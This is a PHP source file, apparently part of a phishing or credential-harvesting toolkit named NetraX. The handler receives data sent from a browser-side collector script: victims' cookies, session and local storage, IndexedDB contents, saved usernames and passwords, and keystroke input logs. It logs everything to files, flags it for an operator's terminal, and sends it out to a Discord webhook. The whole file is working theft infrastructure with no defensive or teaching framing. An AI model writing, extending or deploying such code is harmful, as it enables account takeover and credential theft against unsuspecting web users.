<?php
/* ════════════════════════════════════════════════════════════════════
   cookie_handler.php  -- Cookie, Session ID & Stored Credential Capture
   ──────────────────────────────────────────────────────────────────
   Receives JSON payload from netrax_collector.js.
   ONLY prints to terminal / saves / sends to Discord when
   meaningful data is captured (real cookies, credentials, or storage).
   ════════════════════════════════════════════════════════════════════ */

/* ── Discord Webhook Integration ────────────────────────────── */
if (!defined('DISCORD_WEBHOOK_URL')) {
    require_once __DIR__ . '/../core/discord_webhook.php';
}

/* ── Headers ────────────────────────────────────────────────── */
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

/* ── Handle CORS preflight ──────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

/* ── Only accept POST ───────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   SANITISATION HELPER
   ════════════════════════════════════════════════════════════ */
function cleanCookie(string $val): string {
    return htmlspecialchars(strip_tags(trim($val)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/* ════════════════════════════════════════════════════════════
   HELPER: Filter out NetraX's own _nx_ cookies
   ════════════════════════════════════════════════════════════ */
function filterNxCookies(string $cookieStr): string {
    if (empty($cookieStr) || $cookieStr === 'None') return '';

    $pairs = array_map('trim', explode(';', $cookieStr));
    $real = [];
    foreach ($pairs as $pair) {
        if (empty($pair)) continue;
        // Skip our own planted tracking cookies
        if (strpos($pair, '_nx_') === 0) continue;
        $real[] = $pair;
    }
    return implode('; ', $real);
}

/* ════════════════════════════════════════════════════════════
   INPUT COLLECTION
   ════════════════════════════════════════════════════════════ */
$raw_body = file_get_contents('php://input');
$json_data = json_decode($raw_body, true);

if ($json_data === null) {
    $json_data = $_POST;
}

$raw_cookies       = cleanCookie($json_data['cookies']          ?? 'None');
$tracking_cookies  = cleanCookie($json_data['tracking_cookies'] ?? '');
$session_storage   = cleanCookie($json_data['session_storage']  ?? 'None');
$local_storage     = cleanCookie($json_data['local_storage']    ?? 'None');
$stored_username   = cleanCookie($json_data['stored_username']  ?? '');
$stored_password   = cleanCookie($json_data['stored_password']  ?? '');
$input_log         = cleanCookie($json_data['input_log']        ?? '');
$indexeddb         = cleanCookie($json_data['indexeddb']         ?? '');
$page_url          = cleanCookie($json_data['page_url']         ?? 'Unknown');
$page_title        = cleanCookie($json_data['page_title']       ?? 'Unknown');

/* ── Filter out our own _nx_ cookies from the display ─────── */
$real_cookies = filterNxCookies($raw_cookies);

/* ════════════════════════════════════════════════════════════
   CHECK: Is there meaningful data?
   Only proceed if we captured something real.
   ════════════════════════════════════════════════════════════ */
$has_real_cookies    = !empty($real_cookies);
$has_session_storage = !empty($session_storage) && $session_storage !== 'None';
$has_local_storage   = !empty($local_storage) && $local_storage !== 'None';
$has_credentials     = !empty($stored_username) || !empty($stored_password);
$has_input_log       = !empty($input_log);
$has_indexeddb       = !empty($indexeddb);

$has_meaningful_data = $has_real_cookies || $has_session_storage || $has_local_storage
                     || $has_credentials || $has_input_log || $has_indexeddb;

if (!$has_meaningful_data) {
    // Nothing real captured -- silently succeed without printing/saving/notifying
    echo json_encode(['status' => 'success', 'message' => 'No meaningful data']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   COMMON METADATA
   ════════════════════════════════════════════════════════════ */
$data_dir   = dirname(__DIR__) . '/data';
$timestamp  = date('Y-m-d H:i:s T');
$client_ip  = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}

/* ════════════════════════════════════════════════════════════
   DEDUPLICATION (don't log identical payloads within 30s)
   ════════════════════════════════════════════════════════════ */
$dedup_file = $data_dir . '/.cookie_dedup';
$dedup_key  = md5($client_ip . '|' . $real_cookies . '|' . $stored_username
              . '|' . $stored_password . '|' . $input_log
              . '|' . $session_storage . '|' . $local_storage);
$dedup_data = @file_get_contents($dedup_file);
if ($dedup_data) {
    $dedup = json_decode($dedup_data, true);
    if ($dedup && isset($dedup['key']) && $dedup['key'] === $dedup_key
        && isset($dedup['time']) && (time() - $dedup['time']) < 30) {
        echo json_encode(['status' => 'success', 'message' => 'Already captured']);
        exit;
    }
}
file_put_contents($dedup_file, json_encode(['key' => $dedup_key, 'time' => time()]));

/* ════════════════════════════════════════════════════════════
   BUILD DATA RECORD
   ════════════════════════════════════════════════════════════ */
$record = [
    'timestamp'        => $timestamp,
    'ip'               => $client_ip,
    'user_agent'       => $user_agent,
    'page_url'         => $page_url,
    'page_title'       => $page_title,
    'cookies'          => $real_cookies ?: 'None',
    'tracking_cookies' => $tracking_cookies,
    'session_storage'  => $session_storage,
    'local_storage'    => $local_storage,
    'stored_username'  => $stored_username,
    'stored_password'  => $stored_password,
    'input_log'        => $input_log,
    'indexeddb'        => $indexeddb,
];

/* ════════════════════════════════════════════════════════════
   1. SAVE TO TEXT LOG  (data/cookies_sessions.txt)
   ════════════════════════════════════════════════════════════ */
$divider  = str_repeat('═', 60);
$subdiv   = str_repeat('─', 40);
$txt_entry  = "\n{$divider}\n";
$txt_entry .= "🍪 COOKIE & SESSION CAPTURE  [{$timestamp}]\n";
$txt_entry .= "{$divider}\n";
$txt_entry .= "IP Address      : {$client_ip}\n";
$txt_entry .= "User-Agent      : {$user_agent}\n";
$txt_entry .= "Page            : {$page_title}\n";
$txt_entry .= "URL             : {$page_url}\n";

if ($has_real_cookies) {
    $txt_entry .= "{$subdiv}\n";
    $txt_entry .= "Cookies         : {$real_cookies}\n";
}

if ($has_session_storage) {
    $txt_entry .= "Session Storage : {$session_storage}\n";
}

if ($has_local_storage) {
    $txt_entry .= "Local Storage   : {$local_storage}\n";
}

if ($has_indexeddb) {
    $txt_entry .= "IndexedDB       : {$indexeddb}\n";
}

if ($has_credentials) {
    $txt_entry .= "{$subdiv}\n";
    if (!empty($stored_username)) $txt_entry .= "Stored Username : {$stored_username}\n";
    if (!empty($stored_password)) $txt_entry .= "Stored Password : {$stored_password}\n";
}

if ($has_input_log) {
    $txt_entry .= "{$subdiv}\n";
    $txt_entry .= "Input Capture   : {$input_log}\n";
}

$txt_entry .= "{$divider}\n";

$txt_file = $data_dir . '/cookies_sessions.txt';
$fp = fopen($txt_file, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $txt_entry);
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ════════════════════════════════════════════════════════════
   2. SAVE TO JSONL LOG  (data/cookies_sessions.jsonl)
   ════════════════════════════════════════════════════════════ */
$jsonl_file = $data_dir . '/cookies_sessions.jsonl';
$fp = fopen($jsonl_file, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, json_encode($record, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n");
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ════════════════════════════════════════════════════════════
   3. TERMINAL FLAG  (.flag_cookies)
   ════════════════════════════════════════════════════════════ */
$terminal_output = "[+] IP: {$client_ip}  |  Page: {$page_title}\n";

if ($has_real_cookies) {
    $c_disp = (strlen($real_cookies) > 300) ? substr($real_cookies, 0, 300) . '...' : $real_cookies;
    $terminal_output .= "[+] Cookies: {$c_disp}\n";
}

if ($has_session_storage) {
    $ss_disp = (strlen($session_storage) > 200) ? substr($session_storage, 0, 200) . '...' : $session_storage;
    $terminal_output .= "[+] Session Storage: {$ss_disp}\n";
}

if ($has_local_storage) {
    $ls_disp = (strlen($local_storage) > 200) ? substr($local_storage, 0, 200) . '...' : $local_storage;
    $terminal_output .= "[+] Local Storage: {$ls_disp}\n";
}

if ($has_indexeddb) {
    $terminal_output .= "[+] IndexedDB: {$indexeddb}\n";
}

if (!empty($stored_username)) {
    $terminal_output .= "[+] Stored Username: {$stored_username}\n";
}
if (!empty($stored_password)) {
    $terminal_output .= "[+] Stored Password: {$stored_password}\n";
}

if ($has_input_log) {
    $il_disp = (strlen($input_log) > 300) ? substr($input_log, 0, 300) . '...' : $input_log;
    $terminal_output .= "[+] Input Capture: {$il_disp}\n";
}

file_put_contents($data_dir . '/.flag_cookies', $terminal_output);

/* ════════════════════════════════════════════════════════════
   4. DISCORD WEBHOOK ALERT
   ════════════════════════════════════════════════════════════ */
$discord_fields = [
    '🌐 IP Address' => $client_ip,
    '📄 Page'       => $page_title,
];

if ($has_real_cookies) {
    $discord_fields['🍪 Cookies'] = (strlen($real_cookies) > 200) ? substr($real_cookies, 0, 200) . '…' : $real_cookies;
}

if ($has_session_storage) {
    $discord_fields['📦 Session Store'] = (strlen($session_storage) > 200) ? substr($session_storage, 0, 200) . '…' : $session_storage;
}

if ($has_local_storage) {
    $discord_fields['💾 Local Store'] = (strlen($local_storage) > 200) ? substr($local_storage, 0, 200) . '…' : $local_storage;
}

if ($has_indexeddb) {
    $discord_fields['🗄️ IndexedDB'] = $indexeddb;
}

if (!empty($stored_username)) {
    $discord_fields['👤 Stored User'] = $stored_username;
}
if (!empty($stored_password)) {
    $discord_fields['🔑 Stored Pass'] = $stored_password;
}

if ($has_input_log) {
    $discord_fields['⌨️ Input Log'] = (strlen($input_log) > 200) ? substr($input_log, 0, 200) . '…' : $input_log;
}

sendDiscordAlert('🍪 Cookie & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);

/* ── Success response ── */
echo json_encode(['status' => 'success', 'message' => 'Data captured']);
exit;
